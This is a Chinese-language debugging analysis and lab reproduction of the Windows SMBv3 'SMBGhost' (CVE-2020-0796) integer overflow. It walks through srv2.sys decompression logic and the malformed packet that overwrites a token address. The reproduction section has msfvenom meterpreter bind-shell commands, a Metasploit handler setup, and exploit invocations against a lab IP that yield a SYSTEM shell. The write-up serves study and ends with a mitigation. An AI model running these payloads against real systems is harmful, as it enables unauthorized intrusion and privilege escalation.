# CVE-2020-0796-Windows SMB Ghost远程代码执行本地提权漏洞调试分析

概述：CVE-2020-0796
SMB提权漏洞是一个高危漏洞，被称为“永恒之黑”漏洞，可以在本机上实现提权或系统崩溃等。本文分析SMB漏洞的原理以及对其进行复现。

## 1 漏洞描述

Microsoft服务器消息块3.1.1（SMBv3）协议处理某些请求的方式中存在一个远程执行代码漏洞，也称为“
Windows
SMBv3客户端/服务器远程执行代码漏洞”。CVE-2020-0796是由于SMBv3协议在处理恶意的压缩数据包时出错所造成的；在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出。它可让远程且未经身份验证的攻击者在目标系统上执行任意代码，该漏洞类似于永恒之蓝，被称为“永恒之黑”漏洞。

漏洞公开：[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-0796](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-0796)

影响版本：

Windows 10 Version 1903 for 32-bit Systems

Windows 10 Version 1903 for x64-based Systems

Windows 10 Version 1903 for ARM64-based Systems

Windows Server, Version 1903 (Server Core installation)

Windows 10 Version 1909 for 32-bit Systems

Windows 10 Version 1909 for x64-based Systems

Windows 10 Version 1909 for ARM64-based Systems

Windows Server, Version 1909 (Server Core installation)

## 2 漏洞复现

### 2.1 调试环境

操作系统：VM Windows 10 1903 64位(靶机) 账户：123

![](https://i.loli.net/2020/12/01/bxlFiR93fhVZ2wG.png)

![](https://i.loli.net/2020/12/01/R1zMnp4qkrS2tgB.png)

操作系统：VM Kali 19.04 64位(攻击机)

![](https://i.loli.net/2020/12/01/vqTrJ5GiNVHw4cW.png)

Python版本： Python 3.6

### 2.2 复现结果

打开powershell，切换到漏洞利用程序(https://github.com/danigargu/CVE-2020-0796)所在目录，运行命令：
```
> .\cve-2020-0796=local.exe
```
![](https://i.loli.net/2020/12/01/XpgkT3qEbf8oFr2.png)

## 3 漏洞分析

### 3.1 配置环境

由于Windows10 1903后面发布的有补丁或者无法实现漏洞，因此在网上找到一个链接：
```
ed2k://|file|cn_windows_10_business_editions_version_1903_updated_sept_2019_x64_dvd_2f5281e1.iso|5231140864|B1D5C4C401036B0B1EBA64476A95F338|/
```
采用这个链接迅雷下载进行安装即可。

另外python版本也有一定的要求，无法使用python3.7和python2版本，采用python3.6可以复现成功。

> 注：由于我使用两中不同的POC进行了验证，一种直接在Windows10系统上本地提权，一种利用Kali远程进行提权。Python版本要求只是在本地提权需要限制，在Kali提权时可以利用系统自带的版本。

在官网([https://www.python.org/ftp/python/3.6.0/python-3.6.0-amd64.exe](https://www.python.org/ftp/python/3.6.0/python-3.6.0-amd64.exe))下载安装即可。

搭建完Windows10操作系统后，首先打开网络共享：

![](https://i.loli.net/2020/12/01/DRlFEGrtK3fcAU2.png)

然后要把Windows defender防火墙关闭。

![](https://i.loli.net/2020/12/01/CyFUNVuMZzORPpq.png)

利用主机或kali攻击机ping靶机IP，查看是否ping通。

![](https://i.loli.net/2020/12/01/mhDVFgb91W3CpZU.png)

使用检测工具(https://github.com/ollypwn/SMBGhost)检测是否存在漏洞：

![](https://i.loli.net/2020/12/01/aLpCIPU86OvQ71d.png)

安装成功！！

### 3.2 漏洞分析

Microsoft服务器消息块（SMB）协议是Microsoft
Windows中使用的一项Microsoft网络文件共享协议。在大部分windows系统中都是默认开启的，用于在计算机间共享文件、打印机等。

Windows 10和Windows Server 2016引入了SMB
3.1.1。本次漏洞源于SMBv3没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出。

利用该漏洞，黑客可直接远程攻击SMB服务端远程执行任意恶意代码，亦可通过构建恶意SMB服务端诱导客户端连接从而大规模攻击客户端。

在SMBv2协议中定义了在SMB2.1中添加的如下内容：
```
Protocol negotiation (SMB2 NEGOTIATE)
User authentication (SMB2 SESSION_SETUP, SMB2 LOGOFF)
Share access (SMB2 TREE_CONNECT, SMB2 TREE_DISCONNECT)
File access (SMB2 CREATE, SMB2 CLOSE, SMB2 READ, SMB2 WRITE, SMB2 LOCK, SMB2 IOCTL, SMB2 QUERY_INFO, SMB2 SET_INFO, SMB2 FLUSH, SMB2 CANCEL)
Directory access (SMB2 QUERY_DIRECTORY, SMB2 CHANGE_NOTIFY)
Volume access (SMB2 QUERY_INFO, SMB2 SET_INFO)
Cache coherency (SMB2 OPLOCK_BREAK)
Simple messaging (SMB2 ECHO)
```
在SMB v2中添加了如下内容：
```
Protocol Negotiation (SMB2 NEGOTIATE)
Share Access (SMB2 TREE_CONNECT)
File Access (SMB2 CREATE, SMB2 WRITE)
Cache Coherency (SMB2 OPLOCK_BREAK)
Hash Retrieval (SMB2 IOCTL)
```
在SMB 3.x中添加了如下内容：
```
Protocol Negotiation and secure dialect validation (SMB2 NEGOTIATE, SMB2 IOCTL)
Share Access (SMB2 TREE_CONNECT)
File Access (SMB2 CREATE, SMB2 READ, SMB2 WRITE)
Hash Retrieval (SMB2 IOCTL)
Encryption (SMB2 TRANSFORM_HEADER)
```
另外重点是在SMB3.1.1中添加了：
```
Compression (SMB2 COMPRESSION_TRANSFORM_HEADER)
```
这也说明了为什么该漏洞只影响1903和1909版本，因为SMB3.1.1是在1903才引入的。

CVE-2020-0796漏洞存在于受影响版本的Windows驱动srv2.sys中。Windows SMB v3.1.1
版本增加了对压缩数据的支持，下图所示为带压缩数据的SMB数据报文的构成。

![](https://i.loli.net/2020/12/01/w3A6zVg5P7dGXQx.png)

根据微软MS-SMB2协议文档，SMBCompression Transform Header的结构如：
```
ProtocolId：4字节，固定为0x424D53FC
OriginalComressedSegmentSize：4字节，原始的未压缩数据大小
CompressionAlgorithm：2字节，压缩算法
Flags：2字节，详见协议文档
Offset/Length：根据Flags的取值为Offset或者Length，Offset表示数据包中压缩数据相对于当前结构的偏移
```
![](https://i.loli.net/2020/12/01/QRJDegcGuEIHixd.png)

srv2.sys中处理SMBv3压缩数据包的解压函数Srv2DecompressData未严格校验数据包中OriginalCompressedSegmentSize和Offset/Length字段的合法性。而这两个字段影响了Srv2DecompressData中内存分配函数SrvNetAllocateBuffer的参数。下图所示的Srv2DecompressData函数反编译代码，SrvNetAllocateBuffer实际的参数为OriginalCompressedSegmentSize+Offset。这两个参数都直接来源于数据包中SMB Compression Transform Header中的字段，而函数并未判断这两个字段是否合法，就直接将其相加后作为内存分配的参数(unsigned
int类型）。

![](https://i.loli.net/2020/12/01/rUngyx24LQ3wYTi.png)

这里，OriginalCompressedSegmentSize+Offset可能小于实际需要分配的内存大小，从而在后续调用解压函数SmbCompressionDecompress过程中存在越界读取或者写入的风险。

目前已公开的针对该漏洞的本地提权利用包含如下的主要过程：

（1）验证程序首先创建到SMS server的会话连接（记为session）。

（2）验证程序获取自身token数据结构中privilege成员在内核中的地址（记tokenAddr）。

（3）验证程序通过session发送畸形压缩数据（记为evilData）给SMB server触发漏洞。其中，evilData包含tokenAddr、权限数据、溢出占位数据。

（4） SMS server收到evilData后触发漏洞，并修改tokenAddr地址处的权限数据，从而提升验证程序的权限。

（5）验证程序获取权限后对winlogon进行控制，来创建system用户shell。

首先查看已公开漏洞利用的evilData数据包的内容：

![](https://i.loli.net/2020/12/01/ikp8wvslPQSUybC.png)

数据包的内容很简单，其中几个关键字段数据如下：
```
OriginalSize ：0xffffffff
Offset：0x10
Real compressed data ：13字节的压缩数据，解压后应为1108字节’A’加8字节的token地址。
SMB3 raw data ：实际上是由2个8字节的0x1FF2FFFFBC（总长0x10)加上0x13字节的压缩数据组成
```
从上面的漏洞原理分析可知，漏洞成因是Srv2DecompressData函数对报文字段缺乏合法性判断造成内存分配不当。在该漏洞数据包中，OriginalSize是一个畸形值。OriginalSize+ Offset = 0xffffffff + 0x10 = 0xf 是一个很小的值，其将会传递给SrvNetAllocateBuffer进行调用，下面具体分析内存分配情况。SrvNetAllocateBuffer的反编译代码如下：

![](https://i.loli.net/2020/12/01/aQDI45OwzV9yeGm.png)

由于传给SrvNetAllocateBuffer的参数为0xf，根据SrvNetAllocateBuffer的处理流程可知，该请求内存将从SrvNetBufferLookasides表中分配。这里需要注意的是，变量SrvDisableNetBufferLookAsideList跟注册表项相关，系统默认状态下SrvDisableNetBufferLookAsideList为0。SrvDisableNetBufferLookAsideList变量初始化过程如下：

![](https://i.loli.net/2020/12/01/Z1pRfW7MDl6rJhj.png)

SrvNetBufferLookasides表通过函数SrvNetCreateBuffer初始化，实际SrvNetCreateBuffer循环调用了SrvNetBufferLookasideAllocate分配内存，调用SrvNetBufferLookasideAllocate的参数分别为[‘0x1100’,
‘0x2100’, ‘0x4100’, ‘0x8100’, ‘0x10100’, ‘0x20100’, ‘0x40100’, ‘0x80100’, ‘0x100100’]。在这里，内存分配参数为0xf，对应的lookaside表为0x1100大小的表项。

![](https://i.loli.net/2020/12/01/rwMB7F8b5nTE6oD.png)

SrvNetBufferLookasideAllocate函数实际是调用SrvNetAllocateBufferFromPool来分配内存，如下：

![](https://i.loli.net/2020/12/01/nFj5dHP6IWSlr87.png)

在函数SrvNetAllocateBufferFromPool中，对于用户请求的内存分配大小，内部通过ExAllocatePoolWithTag函数分配的内存实际要大于请求值（多出部分用于存储部分内存相关数据结构）。以请求分配0x1100大小为例，经过一系列判断后，最后分配的内存大小allocate_size= 0x1100 + E8 + 2*(MmSizeOfMdl + 8)。

![](https://i.loli.net/2020/12/01/hDWp4Q5kabeqIEU.png)

内存分配完毕之后，SrvNetAllocateBufferFromPool函数还对分配的内存进行了一系列初始化操作，最后返回了一个内存信息结构体指针作为函数的返回值。

![](https://i.loli.net/2020/12/01/JcUho92r7gGRexS.png)

这里需要注意如下的数据关系：SrvNetAllocateBufferFromPool函数返回值return_buffer指向一个内存数据结构，该内存数据结构起始地址同实际分配内存（函数ExAllocatePoolWithTag分配的内存）起始地址的的偏移为0x1150；return_buffer+0x18位置指向了实际分配内存起始地址偏移0x50位置处，而最终return_buffer会作为函数SrvNetAllocateBuffer的返回值。其内存布局关系如下：

![](https://i.loli.net/2020/12/01/LSnMpYbf3JwBQET.png)

回到漏洞解压函数Srv2DecompressData，在进行内存分配之后，Srv2DecompressData调用函数SmbCompressionDecompress开始解压被压缩的数据。其函数逻辑如下：

![](https://i.loli.net/2020/12/01/RhzwWQocCP5af7g.png)

实际上，该函数调用了Windows库函数RtlDecompressBufferEx2来实现解压，根据RtlDecompressBufferEx2的函数原型来对应分析SmbCompressionDecompress函数的各个参数。
```
SmbCompressionDecompress(CompressAlgo，//压缩算法
Compressed_buf，//指向数据包中的压缩数据
Compressed_size，//数据包中压缩数据大小，计算得到
UnCompressedBuf,//解压后的数据存储地址，\*(alloc_buffer+0x18)+0x10
UnCompressedSize,//压缩数据原始大小,源于数据包OriginalCompressedSegmentSize
FinalUnCompressedSize)//最终解压后数据大小
```
从反编译代码可以看出，函数SmbCompressionDecompress中保存解压后数据的地址为*(alloc_buffer+0x18)+0x10的位置，根据内存分配过程分析，alloc_buffer + 0x18指向了实际内存分配起始位置偏移0x50处，所以拷贝目的地址为实际内存分配起始地址偏移0x60位置处。

在解压过程中，压缩数据解压后将存储到这个地址指向的内存中。根据evilData数据的构造过程，解压后的数据为占坑数据和tokenAddr。拷贝到该处地址后，tokenAddr将覆盖原内存数据结构中alloc_buffer+0x18处的数据。也就是解压缩函数SmbCompressionDecompress返回后，alloc_buffer+0x18将指向验证程序的tokenAddr内核地址。拷贝过程如下所示：

![](https://i.loli.net/2020/12/01/57fwsdcFaL1OMBD.png)

解压完的内存布局：

![](https://i.loli.net/2020/12/01/vXTUjmALQMokENG.png)

继续看Srv2DecompressData的后续处理流程，解压成功后，函数判断offset的结果不为0。不为0则进行内存移动，内存拷贝的参数如下：
```
memmove(*(alloc_buffer+0x18)，SMB_payload，offset)
```
此时alloc_buffer+0x18已经指向验证程序的tokenAddr内核地址，而SMB_payload此时指向evilData中的权限数据，offset则为0x10。因此，这个内存移动完成后，权限数据将写入tokenAddr处。这意味着，SMS Server成功修改了验证程序的权限，从而实现了验证程序的提权！

还有一个细节需要注意，在解压时，Srv2DecompressData函数会判断实际的解压后数据大小FinalUnCompressedSize是否和数据包中原始数据大小OriginalCompressedSegmentSize一致，如下：

![](https://i.loli.net/2020/12/01/Wb54DyfHI8s7uQ3.png)

按理来说实际解压后的数据大小为0x1100，不等于数据包中的原始压缩数据大小0xffffffff，这里应该进入到后面内存释放的流程。然而，实际上在函数SmbCompressionDecompress中，调用RtlDecompressBufferEx2成功后会直接将OriginalCompressedSegmentSize赋值给FinalUnCompressedSize。这也是该漏洞关于任意地址写入成功的关键之一。

![](https://i.loli.net/2020/12/01/d3aE5NDzetOVgFn.png)

### 3.3 动态调试

使用msf生成shellcode：
```
msfvenom -p windows/x64/meterpreter/bind_tcp lport=3333 -f py -o shellcode.txt
```
![](https://i.loli.net/2020/12/01/nKaXyt2f3O17IWl.png)

将生成的shellcode替换exp中的exploit.py中的USER_PAYLOAD保存即可。

![](https://i.loli.net/2020/12/01/ZWhkdam3T7S9YlJ.png)

使用msf开启目标端口连接处理器
```
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf5 exploit(multi/handler) > set rhost 192.168.232.134
rhost => 192.168.232.134
msf5 exploit(multi/handler) > set lport 3333
lport => 3333
msf5 exploit(multi/handler) > run
```
![](https://i.loli.net/2020/12/01/Zs98yOeCIqlbDVk.png)

执行攻击脚本：
```
python3 exploit.py -ip 192.168.232.134
```
![](https://i.loli.net/2020/12/01/8JrjHqwnEmzo1SD.png)

![](https://i.loli.net/2020/12/01/ywklBI7rhszncJt.png)

成功获得shell。

## 4 漏洞修复

CVE-2020-0796是内存破坏漏洞，精心利用可导致远程代码执行，同时网络上已经出现该漏洞的本地提权利用代码。在此，建议受影响版本Windows用户及时根据微软官方漏洞防护公告对该漏洞进行防护。另外根据微软给出的建议，运行regedit.exe，打开注册表编辑器，在HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\
Parameters建立一个名为DisableCompression的DWORD，值为1，禁止SMB的压缩功能。

## 5 总结

## 6 参考

1、[https://www.freebuf.com/column/163101.html](https://www.freebuf.com/column/163101.html)

2、[https://www.dazhuanlan.com/2019/08/21/5d5d14760b737/](https://www.dazhuanlan.com/2019/08/21/5d5d14760b737/)

3、[https://www.freebuf.com/vuls/244582.html](https://www.freebuf.com/vuls/244582.html)

4、[https://www.freebuf.com/articles/others-articles/241937.html](https://www.freebuf.com/vuls/244582.html)

5、[https://www.freebuf.com/vuls/233263.html](https://www.freebuf.com/vuls/244582.html)

6、[https://www.freebuf.com/articles/network/230770.html](https://www.freebuf.com/articles/network/230770.html)